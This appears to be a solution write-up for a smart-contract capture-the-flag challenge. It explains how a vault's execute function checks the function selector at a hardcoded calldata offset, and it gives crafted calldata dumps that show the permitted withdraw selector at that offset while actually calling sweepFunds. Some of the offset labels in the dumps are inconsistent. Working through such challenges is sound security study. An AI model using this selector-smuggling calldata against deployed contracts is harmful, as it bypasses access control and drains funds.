# Solution

In this CTF `SelfAuthorizedVault` exposes 3 key functions `withdraw`, `sweepFunds` and `execute`.

The player is allowed to call `withdraw` but not `sweepFunds`.

Permission verification is enforced in `execute`, and this enforcement is buggy.

```JS
    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }
```

`execute` checks the function selector value of `actionData` with a
hardcoded byte position set in `calldataOffset`.

This can be exploited by crafting an `actionData` such that to expose one selector
at the `calldataOffset` position, but actually invoking another function.

To craft the correct data for the exploit we create two dumps for `execute` and merge them.

```
    <------------------ 32 bytes/256-bits ------------------------->
    1234567890123456789012345678901234567890123456789012345678901234

 execute -> withdraw
 ===================

 00 1cff79cd
 04 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
 24 0000000000000000000000000000000000000000000000000000000000000040 <- actiondata start
 44 0000000000000000000000000000000000000000000000000000000000000064    relative to 04
 64 d9caed12                                                         <- withdraw()
 68 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
 88 00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
 A8 0000000000000000000000000000000000000000000000000de0b6b3a7640000
 C8 00000000000000000000000000000000000000000000000000000000
 E4

 execute -> sweepFunds
 =====================

 00 1cff79cd
 00 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
 00 0000000000000000000000000000000000000000000000000000000000000040
 00 0000000000000000000000000000000000000000000000000000000000000044
 00 85fb709d                                                         <- sweepFunds()
 00 0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc
 00 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
 00 00000000000000000000000000000000000000000000000000000000


 execute -> sweepFunds (attack)
 ==============================

 00 1cff79cd
 04 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
 24 0000000000000000000000000000000000000000000000000000000000000080 <- Extra space!
 44 0000000000000000000000000000000000000000000000000000000000000000
 64 d9caed1200000000000000000000000000000000000000000000000000000000 <- withdraw()
 84 0000000000000000000000000000000000000000000000000000000000000044
 88 85fb709d                                                         <- sweepFunds()
 A8 0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc
 C8 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
 E8 00000000000000000000000000000000000000000000000000000000
```
